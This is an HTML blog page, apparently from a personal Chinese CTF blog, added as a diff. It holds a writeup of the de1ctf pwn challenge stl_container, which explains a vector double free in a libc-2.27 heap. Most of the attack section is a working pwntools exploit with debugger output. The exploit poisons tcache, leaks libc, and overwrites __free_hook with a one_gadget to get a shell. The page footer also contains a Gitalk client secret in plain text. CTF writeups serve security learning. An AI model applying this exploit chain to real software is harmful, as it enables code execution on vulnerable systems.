@@ -1,0 +1,377 @@
+<!DOCTYPE html>
+<html>
+
+<head><meta name="generator" content="Hexo 3.9.0">
+  
+  <title>de1ctf pwn stl_container writeup - 广莫之野</title>
+  <meta charset="UTF-8">
+  <meta name="description" content>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  
+  
+
+  <link rel="shortcut icon" href="/home.png" type="image/png">
+  <meta name="description" content="de1ctf pwn题 stl_container的wp.这题花了大概1天半，我还是太菜了(:з」∠)">
+<meta name="keywords" content="ctf,pwn">
+<meta property="og:type" content="article">
+<meta property="og:title" content="de1ctf pwn stl_container writeup">
+<meta property="og:url" content="http://shiroinu.top/2020/05/04/de1ctf-pwn-stl-container-writeup/index.html">
+<meta property="og:site_name" content="广莫之野">
+<meta property="og:description" content="de1ctf pwn题 stl_container的wp.这题花了大概1天半，我还是太菜了(:з」∠)">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:updated_time" content="2020-05-04T14:55:46.628Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="de1ctf pwn stl_container writeup">
+<meta name="twitter:description" content="de1ctf pwn题 stl_container的wp.这题花了大概1天半，我还是太菜了(:з」∠)">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/mdui@0.4.3/dist/css/mdui.min.css">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@9.15.8/styles/atom-one-dark.css">
+   
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css">
+  
+  
+  <link rel="stylesheet" href="//at.alicdn.com/t/font_1038733_0xvrvpg9c0r.css">
+  <link rel="stylesheet" href="/css/style.css?v=1588604190347">
+</head>
+
+<body class="mdui-drawer-body-left">
+  
+  <div id="nexmoe-background">
+    <div class="nexmoe-bg" style="background-image: url(/images/back1.png)"></div>
+    <div class="mdui-appbar mdui-shadow-0">
+      <div class="mdui-toolbar">
+        <a mdui-drawer="{target: '#drawer', swipe: true}" title="menu" class="mdui-btn mdui-btn-icon"><i class="mdui-icon material-icons">menu</i></a>
+        <div class="mdui-toolbar-spacer"></div>
+        <!--<a href="javascript:;" class="mdui-btn mdui-btn-icon"><i class="mdui-icon material-icons">search</i></a>-->
+        <a href="/" title="tsts" class="mdui-btn mdui-btn-icon"><img src="/images/head.png"></a>
+       </div>
+    </div>
+  </div>
+  <div id="nexmoe-header">
+      <div class="nexmoe-drawer mdui-drawer" id="drawer">
+    <div class="nexmoe-avatar mdui-ripple">
+        <a href="/" title="tsts">
+            <img src="/images/head.png" alt="tsts">
+        </a>
+    </div>
+    <div class="nexmoe-count">
+        <div><span>文章</span>17</div>
+        <div><span>标签</span>2</div>
+        <div><span>分类</span>0</div>
+    </div>
+    <ul class="nexmoe-list mdui-list" mdui-collapse="{accordion: true}">
+        
+        <a class="nexmoe-list-item mdui-list-item mdui-ripple" href="/" title="回到首页">
+            <i class="mdui-list-item-icon nexmoefont icon-home"></i>
+            <div class="mdui-list-item-content">
+                回到首页
+            </div>
+        </a>
+        
+        <a class="nexmoe-list-item mdui-list-item mdui-ripple" href="/about.html" title="关于博客">
+            <i class="mdui-list-item-icon nexmoefont icon-info-circle"></i>
+            <div class="mdui-list-item-content">
+                关于博客
+            </div>
+        </a>
+        
+        <a class="nexmoe-list-item mdui-list-item mdui-ripple" href="/PY.html" title="我的朋友">
+            <i class="mdui-list-item-icon nexmoefont icon-unorderedlist"></i>
+            <div class="mdui-list-item-content">
+                我的朋友
+            </div>
+        </a>
+        
+    </ul>
+    <aside id="nexmoe-sidebar">
+  
+  <div class="nexmoe-widget-wrap">
+    <h3 class="nexmoe-widget-title">社交按钮</h3>
+    <div class="nexmoe-widget nexmoe-social">
+        <a class="mdui-ripple" href="https://github.com/killthatshaman/" target="_blank" mdui-tooltip="{content: 'GitHub'}" style="color: rgb(25, 23, 23);background-color: rgba(25, 23, 23, .15);">
+            <i class="nexmoefont icon-github"></i>
+        </a>
+    </div>
+</div>
+  
+  
+
+  
+  
+  <div class="nexmoe-widget-wrap">
+    <h3 class="nexmoe-widget-title">标签云</h3>
+    <div id="randomtagcloud" class="nexmoe-widget tagcloud">
+      <a href="/tags/ctf/" style="font-size: 20px;">ctf</a> <a href="/tags/pwn/" style="font-size: 10px;">pwn</a>
+    </div>
+    
+  </div>
+
+  
+  
+  <div class="nexmoe-widget-wrap">
+    <h3 class="nexmoe-widget-title">文章归档</h3>
+    <div class="nexmoe-widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/05/">五月 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/04/">四月 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/03/">三月 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/12/">十二月 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/11/">十一月 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/10/">十月 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/09/">九月 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/08/">八月 2019</a></li></ul>
+    </div>
+  </div>
+
+
+  
+</aside>
+    <div class="nexmoe-copyright">
+        &copy; 2020 tsts
+        Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+        & <a href="https://nexmoe.com/hexo-theme-nexmoe.html" target="_blank">Nexmoe</a>
+    </div>
+</div><!-- .nexmoe-drawer -->
+  </div>
+  <div id="nexmoe-content">
+    <div class="nexmoe-primary">
+        <div class="nexmoe-post">
+    <div class="nexmoe-post-cover"> 
+        
+            <img src="/images/back1.png">
+        
+        <h1>de1ctf pwn stl_container writeup</h1>
+    </div>
+  <div class="nexmoe-post-meta">
+    <a><i class="nexmoefont icon-calendar-fill"></i>2020年05月04日</a>
+    <a><i class="nexmoefont icon-areachart"></i>1.2k 字</a>
+    <a><i class="nexmoefont icon-time-circle-fill"></i>大概 6 分钟</a>
+    
+    
+      <a class="nexmoefont icon-tag-fill -link" href="/tags/ctf/">ctf</a> <a class="nexmoefont icon-tag-fill -link" href="/tags/pwn/">pwn</a>
+    
+  </div>
+  <article>
+    <p>de1ctf pwn题 stl_container的wp.<br>这题花了大概1天半，我还是太菜了<em>(:з」∠)</em></p>
+<a id="more"></a>
+<h1 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h1><p>libc-2.27的堆题目，使用了c++的四种stl。<br>主要漏洞点在2.vector的delete中，当连续free两个vector的chunk时，会有double_free.</p>
+<pre><code class="bash">pwndbg&gt; tcachebins
+tcachebins
+0x20 [  3]: 0x55555576e430 —▸ 0x55555576e470 —▸ 0x55555576e450 ◂— 0x0
+0xa0 [  5]: 0x55555576e5f0 ◂— 0x55555576e5f0</code></pre>
+<h2 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h2><p>因为题目的操作很复杂，每次add都是先malloc两个0x98的chunk再把第一个free掉，<br>每次add的大致过程应该是</p>
+<pre><code class="c++">class Test;
+Test temp; //调用构造函数 malloc(0x98) 并且read()
+mVector.push_back(temp); //push时会重新malloc一个chunk 并且复制temp的内容
+//add结束 temp生命周期结束 调用析构函数free</code></pre>
+<p>所以exp里面有几个操作比较值得单独说明。</p>
+<h4 id="1"><a href="#1" class="headerlink" title="1"></a>1</h4><pre><code class="python">
+add(1,&#39;\xf0&#39;) 
+addr = u64(show(1,0).ljust(8,b&#39;\x00&#39;)) 
+log.info(hex(addr))
+tcache = addr - 0x125f0
+log.success(&#39;tcache = &#39; + hex(tcache))
+
+add(3,p64(tcache)) </code></pre>
+<p>第一行<code>add(1,&#39;\xf0&#39;)</code>是为了不破坏tcache上的doublefree链，操作过程为</p>
+<ol>
+<li>malloc(0x98) 得到<code>0x55555576e5f0</code>,tcache为<code>0x55555576e5f0</code>的fd,即依然为<code>0x55555576e5f0</code>,然后读入’\xf0’,fd依旧不变.</li>
+<li>push_back时再malloc一次，得到chunk地址相同，fd还是不变.</li>
+<li>free<code>0x55555576e5f0</code>,tcache链依旧不变.</li>
+</ol>
+<p>之后就可以show()来获得一个堆地址，然后这里选择写tcache结构体的地址.</p>
+<ul>
+<li>值得一提的是，这里一定要是<code>tcache</code>的地址，而不是<code>tcache + 0x10</code>的地址，因为需要修改tcache的size以供之后free使用.</li>
+</ul>
+<h4 id="2"><a href="#2" class="headerlink" title="2"></a>2</h4><pre><code class="python"># size = 0xa1; count(0xa1) = 1 ;entry(0xa1) = tcache + 0x90(即entry自身地址)
+payload = p64(0) + p64(0xa1) + p64(0) + p64(1) + p64(0) * 6 + p64(0) * 8 + p64(tcache + 0x90)
+payload = payload.ljust(0x98,b&#39;\x00&#39;)
+add(3,payload)</code></pre>
+<p>add之前tcache链是<code>0x55555576e5f0 —▸ 0x55555575c000</code><br>此时add就可修改tcache的size和内容。<br>修改对应size的entry为他自身是为了保护entry链和留存下次add时继续修改.<br>该步骤后tcache内容为</p>
+<pre><code class="bash">pwndbg&gt; tcachebins
+tcachebins
+0xa0 [  2]: 0x55555576e5f0 —▸ 0x55555575c090 ◂— 0x55555576e5f0</code></pre>
+<h4 id="3"><a href="#3" class="headerlink" title="3"></a>3</h4><pre><code class="python">#fake_chunk  prev_size 伪造整个tcache 用于free tcache_chunk进入unsortedbin
+payload = p64(tcache + 0x10) + p64(0) + p64(0xa0) + p64(0x21) + p64(0) * 2 + p64(0x20) + p64(0x21)
+payload = payload.ljust(0x98,b&#39;\x00&#39;)
+add(4,payload) #tcache + 0x90</code></pre>
+<p>这步先修改entry为tcache+0x10 之后伪造一个chunk来绕过之后free tcache的检测.<br>伪造的结果:</p>
+<pre><code class="bash">pwndbg&gt; heap              
+0x55555575c000 PREV_INUSE {
+  mchunk_prev_size = 0,
+  mchunk_size = 161,
+  fd = 0x0,
+  bk = 0x1,
+  fd_nextsize = 0x0,
+  bk_nextsize = 0x0
+}
+0x55555575c0a0 FASTBIN {
+  mchunk_prev_size = 160,
+  mchunk_size = 33,
+  fd = 0x0,
+  bk = 0x0,
+  fd_nextsize = 0x20,
+  bk_nextsize = 0x21 
+}
+0x55555575c0c0 FASTBIN {
+  mchunk_prev_size = 32,
+  mchunk_size = 33,
+  fd = 0x0,
+  bk = 0x0,
+  fd_nextsize = 0x0,
+  bk_nextsize = 0x0
+}</code></pre>
+<h4 id="4"><a href="#4" class="headerlink" title="4"></a>4</h4><pre><code class="python">payload = p64(0) + p64(7) + p64(0) * 16 + p64(0xa0) #prev_size
+payload = payload.ljust(0x98,b&#39;\x00&#39;) 
+add(4,payload) #tcache + 0x10
+
+add(1,&#39;\x00&#39;)
+libc_base = u64(show(1,0).ljust(8,b&#39;\x00&#39;)) - 0x3EBCA0
+log.success(&#39;libc_base = &#39; + hex(libc_base))
+one_gadget = libc_base + 0x4f322
+malloc_hook = libc_base + 0x3EBC30
+free_hook = libc_base + 0x3ED8E8
+#gdb.attach(sh)</code></pre>
+<p>这一步修改count = 7 并且将entry修改为<code>NULL</code>.<br>因为如果<code>entry == NULL</code>就不会从tcache中拿chunk，而转而使用其他chunk。</p>
+<pre><code class="c">if (tc_idx &lt; mp_.tcache_bins
+/*&amp;&amp; tc_idx &lt; TCACHE_MAX_BINS*/ /* to appease gcc */
+&amp;&amp; tcache
+&amp;&amp; tcache-&gt;entries[tc_idx] != NULL)
+{
+return tcache_get (tc_idx);
+}</code></pre>
+<p><code>add(4,payload)</code>结束之后，temp被析构，因为count == 7，所以进入unsortedbin,将其add出来获取libc地址.</p>
+<h4 id="5"><a href="#5" class="headerlink" title="5"></a>5</h4><pre><code class="python">delete(4,0)
+payload = p64(0) + p64(1) + p64(0) * 14 + p64(free_hook)
+payload = payload.ljust(0x98,b&#39;\x00&#39;)
+add(2,payload)
+add(2,p64(one_gadget))
+sh.interactive()</code></pre>
+<p>之后将4中add(4)的那个chunk(就是tcache+0x10) free掉,tcache进入unsortedbin.<br>然后将其malloc出来修改count=1,entry为free_hook.<br>最后malloc出free_hook修改为one_gadget,temp析构,成功get shell.</p>
+<h3 id="完整EXP"><a href="#完整EXP" class="headerlink" title="完整EXP"></a>完整EXP</h3><pre><code class="python">#encoding:utf-8
+from pwn import *
+context.log_level = &#39;DEBUG&#39;
+sh = process(&#39;./stl_container&#39;)
+def add(stl,content):
+    sh.sendline(str(stl))
+    sh.recvuntil(&#39;&gt;&gt; &#39;)
+    sh.sendline(&#39;1&#39;)
+    sh.recvuntil(&#39;input data:&#39;)
+    sh.send(content)
+    sh.recvuntil(&#39;&gt;&gt; &#39;,timeout=1)
+
+def delete(stl,index):
+    sh.sendline(str(stl))
+    sh.recvuntil(&#39;&gt;&gt; &#39;)
+    sh.sendline(&#39;2&#39;)
+    if(stl == 1 or stl == 2):
+        sh.recvuntil(&#39;index?\n&#39;)
+        sh.sendline(str(index))
+    sh.recvuntil(&#39;&gt;&gt; &#39;,timeout=1)
+
+def show(stl,index):
+    sh.sendline(str(stl))
+    sh.recvuntil(&#39;&gt;&gt; &#39;)
+    sh.sendline(&#39;3&#39;)
+    sh.recvuntil(&#39;index?\n&#39;)
+    sh.sendline(str(index))
+    sh.recvuntil(&#39;data: &#39;)
+    content = sh.recv(6,timeout=1)
+    log.info(content)
+    sh.recvuntil(&#39;&gt;&gt; &#39;,timeout=1)    
+    return content
+sh.recvuntil(&#39;&gt;&gt; &#39;)
+# add(1,&#39;aaa&#39;)
+# add(1,&#39;bbb&#39;)
+# delete(1,0)
+# delete(1,0)
+
+add(2,&#39;ccc&#39;) # 2 0
+add(2,&#39;ddd&#39;) # 2 1
+add(4,&#39;z&#39;) # 4 0
+add(4,&#39;z&#39;) # 4 1 gap_between_top
+delete(4,0)
+delete(4,0)
+delete(2,0)
+delete(2,0)
+
+
+#gdb.attach(sh)
+add(1,&#39;\xf0&#39;) # 1 0
+
+addr = u64(show(1,0).ljust(8,b&#39;\x00&#39;)) 
+log.info(hex(addr))
+tcache = addr - 0x125f0
+log.success(&#39;tcache = &#39; + hex(tcache))
+
+add(3,p64(tcache)) # 3 0
+payload = p64(0) + p64(0xa1) + p64(0) + p64(1) + p64(0) * 6 + p64(0) * 8 + p64(tcache + 0x90)
+payload = payload.ljust(0x98,b&#39;\x00&#39;)
+add(3,payload)
+#fake_chunk  prev_size 用于free进入unsortedbin
+payload = p64(tcache + 0x10) + p64(0) + p64(0xa0) + p64(0x21) + p64(0) * 2 + p64(0x20) + p64(0x21)
+payload = payload.ljust(0x98,b&#39;\x00&#39;)
+add(4,payload) #tcache + 0x90
+
+payload = p64(0) + p64(7) + p64(0) * 16 + p64(0xa0) #prev_size
+payload = payload.ljust(0x98,b&#39;\x00&#39;) 
+add(4,payload) #tcache + 0x10
+
+add(1,&#39;\x00&#39;)
+
+libc_base = u64(show(1,0).ljust(8,b&#39;\x00&#39;)) - 0x3EBCA0
+log.success(&#39;libc_base = &#39; + hex(libc_base))
+one_gadget = libc_base + 0x4f322
+malloc_hook = libc_base + 0x3EBC30
+free_hook = libc_base + 0x3ED8E8
+#gdb.attach(sh)
+delete(4,0)
+payload = p64(0) + p64(1) + p64(0) * 14 + p64(free_hook)
+payload = payload.ljust(0x98,b&#39;\x00&#39;)
+add(2,payload)
+add(2,p64(one_gadget))
+sh.interactive()</code></pre>
+
+  </article>
+  
+    
+
+  
+  <section class="nexmoe-comment">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/gitalk@1.5.0/dist/gitalk.min.css">
+<div id="gitalk"></div>
+<script src="https://cdn.jsdelivr.net/npm/gitalk@1.5.0/dist/gitalk.min.js"></script>
+<script type="text/javascript">
+    var gitalk = new Gitalk({
+        clientID: '80b2453b6d5f37ad6225',
+        clientSecret: '43e99fa852795c9a7b3eb924b2558c64b84bbdeb',
+        id: window.location.pathname,
+        repo: 'nexmoe.github.io',
+        owner: 'nexmoe',
+        admin: 'nexmoe'
+    })
+    gitalk.render('gitalk')
+</script>
+</section>
+</div>
+    </div>
+  </div>
+  <script src="https://cdn.jsdelivr.net/npm/mdui@0.4.3/dist/js/mdui.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/jquery@3.4.1/dist/jquery.min.js"></script>
+ 
+    <script src="https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js"></script>
+
+
+ 
+    <script src="https://cdn.jsdelivr.net/npm/smoothscroll-for-websites@1.4.9/SmoothScroll.min.js"></script>
+
+
+<script src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@9.15.8/build/highlight.min.js"></script>
+<script>hljs.initHighlightingOnLoad();</script>
+
+<script src="/js/app.js?v=1588604190355"></script>
+<script src="https://cdn.jsdelivr.net/npm/lazysizes@5.1.0/lazysizes.min.js"></script>
+
+
+
+
+  
+
+
+
+
+
+</body>
+
+</html>
